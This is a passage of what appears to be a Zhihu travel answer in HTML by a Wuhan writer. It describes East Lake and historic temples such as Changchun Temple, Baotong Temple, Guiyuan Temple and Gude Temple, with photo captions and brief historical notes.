src=\"https://pic1.zhimg.com/v2-f57f0d263bfbdf713aefa3a431088ff4_720w.jpg?rss\" data-rawwidth=\"4752\" data-rawheight=\"3168\" data-size=\"normal\" data-caption=\"万里长江第一桥武汉长江一桥1957年建——摄影胡西雷。\" data-watermark=\"watermark\" data-original-src=\"v2-f57f0d263bfbdf713aefa3a431088ff4\" data-watermark-src=\"v2-86c5ed678ac06202a90c2f6006525608\" data-private-watermark-src=\"v2-71600449c1404f87ff121d40d572853e\"></p>\n<p>近十年来武汉城市整体面貌大改观：城市规划、城市建设、城市建筑、城市交通发展可以用“日新月异”来形容。住城市中心区的我如果有几个月没有到另一个城区去，再去那天周遭风景变得不认识：一条一条地铁线开通，一道一道高架修起，一个一个城区楼房高耸，长江上新建大桥一座接一座，园林绿化地一片接一片，商业、娱乐、休闲，室内外场地从老城区延展到新城区，星罗棋布，每逢周末和节假日车水马龙、人潮汹涌……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-268dea3fd8bca6bdecb794939851ab8d_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"武汉二环，下班路上，前方二七长江大桥——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-268dea3fd8bca6bdecb794939851ab8d\" data-watermark-src=\"v2-ad0ed18730a030e66550f8f022b80b8d\" data-private-watermark-src=\"v2-5ec4c7147665fcb4d8c592015c1cc9aa\"></p>\n<p>特别是三镇餐饮业，价格便宜且美味。不来不知道，不比不知道（武汉小吃，比同规模城市的确便宜很多）——链接一个我的知乎文推介一下，就不重复了。美食感兴趣的朋友点开下面链接。</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/453229200/answer/1833906473\" data-image=\"https://pic1.zhimg.com/v2-95337415f309fe5506afc6e94ea13108_qhd.jpg\" data-image-width=\"1920\" data-image-height=\"1080\" class=\"internal\">除了热干面，你认为最能代表武汉的食物还有什么？</a><p>这篇文章主要介绍武汉传统小吃，其他诸如时尚餐饮业（国内川菜、湘菜、粤菜……国外日餐、韩餐，意大利餐、法兰西餐、美式快餐、巴西烧烤……）在武汉也非常兴旺。不属本答题主旨，</p>\n<p>业界人士都知道武汉旅游景点排行榜，“几菜一汤”，吐槽“老一套”。吐槽归吐槽，黄鹤楼、归元寺、宝通寺、长春观，东湖，所以名列前茅，必然有它的道理。如故宫之于北京，外滩之于上海，杜甫草堂之于成都，拙政园之于苏州，西湖之于杭州，“小蛮腰”之于广州，陕西博物馆之于西安，解放碑之于重庆……都属第一次去这个城市非去不可的景点。武汉几处著名景点也一样。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-16385bc059d96604ad466d787c47ea5c_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"长江流经武汉，波涛汹涌、波澜壮阔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-16385bc059d96604ad466d787c47ea5c\" data-watermark-src=\"v2-dc6b02dd8f12a28a215b504642eebc57\" data-private-watermark-src=\"v2-8f317e7648b0fda0e514ae5518fac540\"></p>\n<p>强调一下：没和武汉旅游业界有合作，没拿任何景区一分钱。来知乎回答这个问题，因为《知乎·武汉》对我的信任，希望有武汉城市学研究者参与对武汉城市文化讲述。作为武汉本土文人，我“义不容辞”。下面文字公益写作，喜欢的网友，就，看文吧。</p>\n<p><b>一、东湖</b></p>\n<p>第一次来武汉的人一定要游东湖。城中湖，大而美！</p>\n<p>摘录我写东湖的散文其中几个小段落。</p>\n<h3><b>碧水蓝天武汉东湖</b></h3>\n<p>有一年去杭州，绕着西湖转了一圈。两相比较，觉得还是我们武汉的东湖好。</p>\n<p>东湖位于古武昌东郊，由郭郑湖、水果湖、喻家湖、汤湖、牛巢湖五个湖泊组成的一个自然湖，南与沙湖贯通，经青山港注入长江，江河湖海相通，古云梦泽留下的一泓活水，千年万年不断绝的水的源头。</p>\n<p>20世纪末，城市建设兴起，市区向郊区扩展，东湖早已划归武昌城市圈以内，景区面积81.68平方公里，湖区面积33平方公里，杭州西湖的六倍，中国最大的城中湖。</p>\n<p>(注：武汉市扩大城区，汤逊湖划入版图，现在东湖应为中国第二大人工湖）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-afb72d485b69a10fe39fa9d9ce1f5bcd_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖磨山楚城——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-afb72d485b69a10fe39fa9d9ce1f5bcd\" data-watermark-src=\"v2-1e65d860ca6fff4c0d6c63ef75dc19f8\" data-private-watermark-src=\"v2-afc39302e4c35cddd65fe4b2c8c76408\"></p>\n<p>地图上看，东湖在武汉市，长江南岸，武昌东北部，上窄下宽，一个巨大的三角形，水域阔大，水岸线绵长，呈“∪”形凸凹曲折，民间传说有“九十九湾”，其实不止，湖区岬湾一共 120处，天然的半岛和港湾，沿湖岸陆地地貌复杂多样，丘陵、谷地、平野，高低错落，间杂其间；湖水深广，水质优良，出产丰富，莲藕和鱼类东湖特产。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-42b82f71d3c2f548c8976141e658f09e_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖听涛区——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-42b82f71d3c2f548c8976141e658f09e\" data-watermark-src=\"v2-6c789a3149f2b1d98cde997ef476f98d\" data-private-watermark-src=\"v2-730adbf4d82034637b74f4b2c3750914\"></p>\n<p>东湖的开发自20世纪三十年代始。银行家周苍柏在东湖南端买下一大块荒地沼泽，取名“海光农圃”，种植树木，挖掘池塘，修筑道路和堤岸。1949年后，周先生将辛苦经营多年的私家园林捐赠给国家，后来东湖的“雏形”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0d08641f9ee0ec7f7f45ca743f0bff6f_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖每一片湖区夏季荷花盛开——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0d08641f9ee0ec7f7f45ca743f0bff6f\" data-watermark-src=\"v2-9e41f0587da915c4f195ee6810eb044b\" data-private-watermark-src=\"v2-449546987a565663578ea84d15d477af\"></p>\n<p>站在伸向湖水的岸边一角，隔万顷碧波，对岸是青若屏障的珞珈山，武汉大学翠绿的琉璃瓦顶太阳下隐约闪光……身边不远有人钓鱼，朝湖上甩出长长的丝绳；松林很静，有几只灰色羽毛的喜鹊拖着长尾飞过。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7aece6cca8445474468da1ba60c21a5e_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖畔柳——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7aece6cca8445474468da1ba60c21a5e\" data-watermark-src=\"v2-193ad6ed844660004513687a814394f8\" data-private-watermark-src=\"v2-4ba52147ef2a9c757bb0df7bc3caef73\"></p>\n<p>东湖，水域辽阔，地貌复杂，东南西北，四面八方，水上岸上，风景各异，分为“听涛”、“磨山”、“落雁”、“白马”、“珞洪”、“吹笛”六大风景区。</p>\n<p>去东湖玩，走黄鹂湾，东湖宾馆建在湖边山坡上，朝里走，沿湖数里湖区深处，长长一条湖心路走进一处大花园，这就是著名的梅岭。枝繁叶茂的大树间几栋式样朴素的楼房，明亮的玻璃窗向湖面，梅岭1号、梅岭3号、梅岭5号和南山甲所，环境幽静，格调典雅，远处湖光山色，近旁花木森森……20年世纪末对外开放。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d39efeb3184d0d80cc85ae82ae349e15_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"东湖一小部分，东湖宾馆和梅岭，我认为是东湖最美一部分——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-d39efeb3184d0d80cc85ae82ae349e15\" data-watermark-src=\"v2-e2aae98474c71d26a334c75af1f164ad\" data-private-watermark-src=\"v2-48d94f87a85e146c758be91a55ccb2e9\"></p>\n<p>黄鹂湾东湖景区大门进去是听涛区，隔着遥遥地看见一大片湖水，湖畔长长一排柳树，春天的柳树芽是嫩嫩的金色，夏天的柳树叶片长长的如同美人的眉毛，柳树枝条柔韧绵长地垂到湖面，湖水漾起一圈圈涟漪。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b287a230c824d244e8d1a5668c713a8_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"东湖梅岭南山甲所——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6b287a230c824d244e8d1a5668c713a8\" data-watermark-src=\"v2-b5db00813aa1d33a08534dd52201f1fe\" data-private-watermark-src=\"v2-e7ee0df665bb15c820f768972bc5f7d8\"></p>\n<p>顺着湖岸走，行吟阁、屈原纪念馆、橘颂亭，茂林修竹的深处，翠甍飞檐，素墙灰瓦，清幽静寂的蜃楼仙境。</p>\n<p>今天的武昌，战国时名鄂渚，楚国属地，相传楚大夫屈原被楚顷襄王放逐经行于此。</p>\n<p>“乘鄂渚而反顾兮，欸秋冬之绪风，步余马兮山皋，邸余车兮方林……”（屈原《涉江》）</p>\n<p>行吟阁位于东湖西北岸中部的小岛上，四面环水，荷风、落羽两道白石桥和陆地相连，三层四角攒尖顶古典楼阁，阁楼前立着白石雕塑屈原像。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-587347e3fcab31848bc7dd558751b8c3_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"行吟阁屈原纪念馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-587347e3fcab31848bc7dd558751b8c3\" data-watermark-src=\"v2-270d87a65c75e7167a8cc73aa09c3069\" data-private-watermark-src=\"v2-40aac0281caef16d3f74e05ffbc4d849\"></p>\n<p>长天楼，取唐代诗人王勃辞赋一句：“秋水共长天一色”，情致和意境都非常吻合。绿瓦白墙，翘脊飞拱，镂空花窗，左右空廊向两端伸展，楼上楼下，最适合观赏湖上风景，视野开阔，纵览无余，水天一色、天水无际，气魄宏大如一片海。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5c49dda311d2415c1e1455fca46ec369_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖面太浩大，如果镜头仅对湖，照片上一片茫茫碧水，感觉不到风景，其实就是风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5c49dda311d2415c1e1455fca46ec369\" data-watermark-src=\"v2-b93c8a065f5fb69ed5667bae3f49daeb\" data-private-watermark-src=\"v2-d1c84c249cf1e35290dcee9d7926b894\"></p>\n<p>往北，梨园，秋天果树飘香的季节来这里最好，每年菊花展也选在园内举行，粗壮的大树，青翠的竹林，还有春天开花夏秋结果的桃树和李树，园子里有石路，树阴下有石凳，花香和鸟语，浅草和平湖……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2247b0ca3983202fb90e042cff662058_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖畔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2247b0ca3983202fb90e042cff662058\" data-watermark-src=\"v2-a6aa2a267e548a551e325b3fae1730c2\" data-private-watermark-src=\"v2-0b7ad560d9e27932a4ce0754703b9a52\"></p>\n<p>有木船过对岸，早先有船娘摇船（现在有没有不清楚），两根木桨长长交叉划水，水在身下极清，透明如玻璃，伸手进湖水，水草碧绒绒的如女人的长发；阳光从天上射下来，湖上波光动摇，片片如金鳞。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-952640ceea0b8a87dfde48f845b7584c_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖磨山，游客必游之地——摄影胡西雷（我和弟弟胡西雷拍摄武汉三镇建筑风景将近20年）\" data-watermark=\"watermark\" data-original-src=\"v2-952640ceea0b8a87dfde48f845b7584c\" data-watermark-src=\"v2-0ef67a834484fa91b9c7cb9c78cd97a8\" data-private-watermark-src=\"v2-bf6de14f71c224bb0eb0859401edf8e8\"></p>\n<p>冬天赏雪去东湖钓鱼台，脚下石台如方舟浮动在湖面，雪花飘飘从天而降，身内身外皆是琼楼玉宇。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2c90f93a7aff76bb75de9b6304ffa876_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖钓鱼台——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2c90f93a7aff76bb75de9b6304ffa876\" data-watermark-src=\"v2-d77d27f92d01f02f040062041770c663\" data-private-watermark-src=\"v2-c40fe68bd713d8f25acc124f97f5c080\"></p>\n<p>磨山植物园，面积70公顷，全园共建有珍稀植物区、观赏植物区、水生植物区、药用植物区、猕猴桃园、松柏园、树木园、竹园等十多个专类园区和园林景区，引进各类植物近4000种，是我国华中地区最大的植物资源收藏中心和中国北亚热带植物研究保护基地。其中有中国最大的梅园，面积800余亩，一万株梅树，301个梅花品种。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2de4cd069635ae87df73076de8995ae6_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"磨山植物园内经心书院——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2de4cd069635ae87df73076de8995ae6\" data-watermark-src=\"v2-4366a688e202b8918bb1f653c4e68b7b\" data-private-watermark-src=\"v2-e651cdf4fe778054f8615bf7dc31ca44\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-52ea66d0110b40e13608494c3f22bdef_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"磨山梅园——摄影胡榴明（我去的季节不是梅花开放的季节，以后有机会补拍）\" data-watermark=\"watermark\" data-original-src=\"v2-52ea66d0110b40e13608494c3f22bdef\" data-watermark-src=\"v2-9c2cab20a24183505edc411b32150a3f\" data-private-watermark-src=\"v2-14b9cbb26753f3acfe1783eaace61bbe\"></p>\n<p>乘缆车登磨山顶，金辉灿烂的楚天台上耸立1.2米高铜凤——凤鸟 长江流域楚文化图腾，与黄河流域龙文化遥相呼应，云梦大泽中出生的太阳鸟……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-38301733fab1959c4ba0be17c92f718d_720w.jpg?rss\" data-rawwidth=\"1056\" data-rawheight=\"797\" data-size=\"normal\" data-caption=\"东湖磨山楚城铜雕凤鸟是楚文化图腾——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-38301733fab1959c4ba0be17c92f718d\" data-watermark-src=\"v2-7f9fbb6bffd9f8a0d83891f4704350c2\" data-private-watermark-src=\"v2-bbf778a9d886cddfe803d5efa62f1072\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-afb72d485b69a10fe39fa9d9ce1f5bcd_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"磨山楚城，仿春秋楚国都城郢都(纪南城）出土陶塑城楼模型比例扩大建造，有一定古文化观摩价值，城内有楚街等仿古文化雕塑群及自然风景区，规模很大——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-afb72d485b69a10fe39fa9d9ce1f5bcd\" data-watermark-src=\"v2-1e65d860ca6fff4c0d6c63ef75dc19f8\" data-private-watermark-src=\"v2-afc39302e4c35cddd65fe4b2c8c76408\"></p>\n<p>朱碑亭（朱德亲笔题字石碑）内看东湖，湖面更阔，湖水更碧，湖光山色没入天的那一边，心灵神思飞向很远很远。</p>\n<p>行在湖边，浮在湖上，荡漾在湖水之间，烟水迷茫处，让你沉醉得找不到自己。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-108cb77f425973ba568a47e332e5aaff_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"远眺东湖湖山相映衬——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-108cb77f425973ba568a47e332e5aaff\" data-watermark-src=\"v2-8068781d87f4e4cc9abcd60f8f1021a5\" data-private-watermark-src=\"v2-735e2c954360f260795b9831160e6fde\"></p>\n<p>湖北博物馆坐落在东湖之滨，乌红瓦顶，朱红窗櫺，粗犷的石头门柱，光滑的石头廊台，取楚国宫殿建筑格局，占地6.4公顷，有中国大陆规模最宏大、门类最齐全、功能最完备的古乐器陈列馆。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-441324b19c4bfb2b5d26fe4e818b735e_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"黄樱子在东湖畔湖北省博物馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-441324b19c4bfb2b5d26fe4e818b735e\" data-watermark-src=\"v2-0d512897028b63f5513c38124aae4ee5\" data-private-watermark-src=\"v2-d5837797a93162689cc3d5c2523d0685\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-14d86d6f0a6d39cc653b233a9723b600_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"湖北省博物馆曾侯乙编钟（部分）世界瑰宝——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-14d86d6f0a6d39cc653b233a9723b600\" data-watermark-src=\"v2-1083b017bf537e12cb0c538594d79664\" data-private-watermark-src=\"v2-fa864ff4d6194a4c6da362de0be33c34\"></p>\n<p>曾侯乙墓出土战国时期巨型青铜编钟器群、曾侯乙墓出土战国时期的青铜编磬、越王勾践青铜剑、黄陂盘龙城出土商代大玉戈、战国时期虎座鸟架鼓……“物华天宝、人杰地灵”，每一寸土下都有珍藏，20万件举世瞩目的珍品。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a48283cb31f58c0e0a228b30c331ecc_720w.jpg?rss\" data-rawwidth=\"2590\" data-rawheight=\"1567\" data-size=\"normal\" data-caption=\"东湖磨山女娲石雕——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-9a48283cb31f58c0e0a228b30c331ecc\" data-watermark-src=\"v2-23131ead751a24be302a7f60ff1130ad\" data-private-watermark-src=\"v2-84b43c24183a44d2d87031bcd35dc51d\"></p>\n<p><b>小结：</b>以上图片拍摄于十年前，那时东湖绿道还没有修筑，其他数个景区还没有系统规模。近三年东湖环境建设美丽而宏大，例如近几年新开辟东湖绿道我还没有来得及去（有天开车过去，天色已晚，在绿道起始端止步不前，返回了），朋友圈圈友发图风景美不胜收……</p>\n<h3>二、三镇古寺院——古建筑历史文化</h3>\n<h3>道教福地——长春观</h3>\n<p>长春观坐落在武昌蛇山中段，山门洞开，殿阁重重，乌瓦红墙，飞檐翘角，从山脚直到山顶，逐级升上去，如一幅巨大的工笔界画，笔墨精细、青绿彩绘的古代山水殿阁图，从山上直垂到山下……</p>\n<p>长春观给予游人最大的观赏价值正在于此……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b8752f425978b23b05613ce8b454455d_720w.jpg?rss\" data-rawwidth=\"2487\" data-rawheight=\"1615\" data-size=\"normal\" data-caption=\"长春观原来在武昌古城门外，1926年拆毁武昌古城墙，半世纪后位于城中心。建筑不会移动，城圈往外扩了又扩——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b8752f425978b23b05613ce8b454455d\" data-watermark-src=\"v2-f520b2f8ea7eb5a1cd1424945cefeeb3\" data-private-watermark-src=\"v2-0d0cd307d68280a19a4897a2a0f801fa\"></p>\n<p>最早的传说，老子从鲁地来到江南，在今天的蛇山这个地方设坛传道。宋代理学家朱熹从江西游历至湖北，《鄂州社稷坛记》 ：“（鄂州：今武昌）城东黄鹄山，废营地一区。东西十丈，南北倍差，按政和五礼画为四坛”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cad19e2d6356afab639952af850be990_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"长春观曾经被毁，但从图上可见，这座建筑是“修复”而非“重建”，地道古建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-cad19e2d6356afab639952af850be990\" data-watermark-src=\"v2-fa95806ebe45903c96cee1df6074f46a\" data-private-watermark-src=\"v2-28d972b0f05834fb0465320511b1ab29\"></p>\n<p>元代道家传人丘处机（金庸的武侠系列“丘道长”成就他今天的知名度）在此结草庐修炼，自称“长春子”，后来他的弟子在此建“长春观”纪念——长春观得名之历史渊源。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa364489874b0be500ac60e889a98b8a_720w.jpg?rss\" data-rawwidth=\"2304\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"特别喜欢这样古朴苍老的建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fa364489874b0be500ac60e889a98b8a\" data-watermark-src=\"v2-81a07893bd03996d65c94d5d7a49c14f\" data-private-watermark-src=\"v2-e6947564a8aced0987a79f42af295eeb\"></p>\n<p>清咸丰二年（1852年），太平军攻武昌城，城墙外长春观为攻城指挥部，先攻下汉阳和汉口，后攻下武昌，毁掉武昌大东门外长春观和宝通寺。</p>\n<p>今长春观于清同治三年重新修造，仿明永乐十二年及清康熙二十六年建筑样式，抹去历史断层，接续两千年道教传承，自那以后，武昌城内外，蛇山上下，古风古韵悠然传承今天。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0e4f0aa094bee5b1499126204d469773_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"长春观会仙桥，由此上去往山上走，风景更幽深——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-0e4f0aa094bee5b1499126204d469773\" data-watermark-src=\"v2-f1165175362dc415551a3430852a553c\" data-private-watermark-src=\"v2-400f2c89ba067dd59dad7676b57a4859\"></p>\n<h3>千年古刹——宝通寺</h3>\n<p>长江南岸武昌多山（丘陵平原湖沼相间），蛇山最著名的园林建筑黄鹤楼公园，洪山最著名的园林建筑宝通禅寺，珞珈山最著名的园林建筑武汉大学。</p>\n<p>宝通寺位于洪山南麓，山门朝向车马川流的武珞路，与长春观的建筑方位平行一致。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-307a2616383b70785b76722c7b9d8f27_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"层层石阶朝上走是参观宝通寺的顺序，因为寺院建在山南坡——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-307a2616383b70785b76722c7b9d8f27\" data-watermark-src=\"v2-8b886ae4264d301c42647b725c5d7163\" data-private-watermark-src=\"v2-25afe0412c4cf5c7bf95a668bf756ec3\"></p>\n<p>最早，建于南朝刘宋年间（公元420－479年），距今1580年，武汉三镇寺庙历史最为久远的一座。明成化二十一年定名宝通禅寺，之后数次毁于兵火，今天所见规模于光绪年间及同治年间所建。 </p>\n<p>路边进入山门，门前一对相貌威猛的大石头狮子为明代文物（注：进门前一定不要无视啊！）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-20d4b1fab2f6a704390751a4809486ef_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"双重高台基，石阶，石栏，石柱上的莲花柱头，石阶中间的龙雕丹陛石，精美而古老——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-20d4b1fab2f6a704390751a4809486ef\" data-watermark-src=\"v2-817aac2a4ceb35a37d3124251c1a8830\" data-private-watermark-src=\"v2-40049b694a4a2de32e08c1110ad28871\"></p>\n<p>站在拱形山门前，探头朝里望去，只见殿阁层层依山而上，宝塔巍巍背山而立，林木森森，山石峻峭，映衬着金瓦、红墙、彩绘木雕、白石台阶和白石栏杆……刹那回到千年前。</p>\n<p>洪山宝塔，原名临济塔，元代建成，共有七级，取“七级浮屠”之意，先为砖木结构，山间潮湿，日久容易溃烂。1865年，湖广总督署和湖北巡抚决定集资重修。1871年施工，改砖木结构为石结构，建铁护栏，耗铜6500公斤铸造塔顶，1879年竣工。也就是说。今天我们所见洪山金顶宝塔为清末年建筑。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3090b2b074633a9f91937e93fac50df7_720w.jpg?rss\" data-rawwidth=\"2304\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"中国著名佛塔之一洪山宝塔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-3090b2b074633a9f91937e93fac50df7\" data-watermark-src=\"v2-ec9edeea32040773eaf41044a02c9d72\" data-private-watermark-src=\"v2-28b9c163334130a30dff5530f21633c4\"></p>\n<p>盘旋而上，俯瞰大江南北武汉三镇——登高而小我，登高而小天下，与黄鹤楼登临全然不一样的感觉（指地方不同登临望远的视野也就是关注点也就起了变化。各有各的风景壮美，没有厚此薄彼的意思。不要来扛！）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-48381a1e4967c60c4518804535851a24_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"宝通禅寺大殿正门前陛石石刻云中双游龙（古迹）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-48381a1e4967c60c4518804535851a24\" data-watermark-src=\"v2-6a61ee8a3720349d4c3c56fda79b88cb\" data-private-watermark-src=\"v2-f6b26e065f749d3d9c2f80adc21976f2\"></p>\n<p>寺内泉水涌出，殿侧古木参天，修林茂竹，奇石摩崖，走一步一处古迹，走一步一段故事，历史绵延不绝，传说绵延不绝，山川景象和人融为一体，寺院永不衰老的秘密。</p>\n<h3>皇家寺院——归元寺</h3>\n<p>归元寺建于明末清初，占地70亩，建筑平面2万平方米。现存殿堂28栋，分为五个院落，建筑年代悠久，建筑规模宏大，环境幽雅，殿堂华丽，数百年来，香火旺盛，香客云集，名扬海内外。</p>\n<p>归元寺开山祖师白光、主峰兄弟，出生江浙，来到湖北汉阳兴国寺，开馆行医，感动地方百姓。清顺治十六年，民间信众集资买王氏花园修建归元禅寺供兄弟二人坐堂传经。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9253aef7df7433209f64d2cdcf680dd2_720w.jpg?rss\" data-rawwidth=\"2688\" data-rawheight=\"1908\" data-size=\"normal\" data-caption=\"归元寺藏经阁——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9253aef7df7433209f64d2cdcf680dd2\" data-watermark-src=\"v2-00da8ab0cdd1831744c10948f2336bf5\" data-private-watermark-src=\"v2-23c3da58f35bd2d5c1d59b1da7547bf8\"></p>\n<p>归元寺山门上方，蓝地金字直匾，“归元禅寺”四个大字，光绪皇帝敕赐于光绪十三年（1887年）。</p>\n<p>大雄宝殿、藏经阁、罗汉堂……铜质观音像、白玉佛……其中罗汉堂彩绘脱胎漆制作真人大小五百罗汉为国内佛造像珍品。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac14cde355b538611a85fb8117b898e0_720w.jpg?rss\" data-rawwidth=\"2856\" data-rawheight=\"2104\" data-size=\"normal\" data-caption=\"归元寺罗汉堂500罗汉——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ac14cde355b538611a85fb8117b898e0\" data-watermark-src=\"v2-46b1fa3ce8b48d459eef1820e7fab6d6\" data-private-watermark-src=\"v2-89d8f56ad064775a3f4560f31e75eb4e\"></p>\n<p>归元寺五百罗汉由湖北武汉黄陂王氏父子九年时间塑成。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f3141ba7015b284868ea0ba11233570e_720w.jpg?rss\" data-rawwidth=\"3039\" data-rawheight=\"1906\" data-size=\"normal\" data-caption=\"前殿和放生池——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f3141ba7015b284868ea0ba11233570e\" data-watermark-src=\"v2-55ad8ca6552f22a671e73fa2121a2ac4\" data-private-watermark-src=\"v2-0d85fe8c79fe9e2ebb8d8afb878697c0\"></p>\n<p>上世纪末以来，归元寺香火旺盛至极，逢年过节，信男善女汹涌如潮。报载某年初五凌晨，武汉市民四十万人涌入寺内敬香，有关部门不得不出动3000名保安维护秩序。</p>\n<p>三百年六十年历史的一座寺院，俨然武汉“梵林之首”！“亲民”自然是其中最重要的因素。</p>\n<h3>缅印古风——古德寺</h3>\n<p>古德寺原名古德茅蓬，最初建于清光绪三年（1877年），当年建筑风格与汉地文化圈常见佛寺一般无二。民国初年（1914年至1919年）扩建面积将近三万平方米，这其中一个非常重要的变化是，改中华汉地佛教圈传统中式佛寺建筑风格为缅印佛教文化圈异域建筑风格——和云南等地小乘佛教寺院建筑风格不同，和西藏青海内蒙河北承德等藏传佛教寺院建筑风格更不同。</p>\n<p>专家研究后称为：缅印佛寺建筑风。据说，类似建筑风格的佛寺国内仅此一座，东南亚地区也只有两座（此论可商榷）。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3cfccb2819cb8668b0e244c0d8fe28e2_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"和中华内地佛教圈寺院建筑风格完全不一样的佛寺建筑在中国中心城市武汉汉口——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-3cfccb2819cb8668b0e244c0d8fe28e2\" data-watermark-src=\"v2-acd4476a53b7c1cf9d8c85cdefa83fad\" 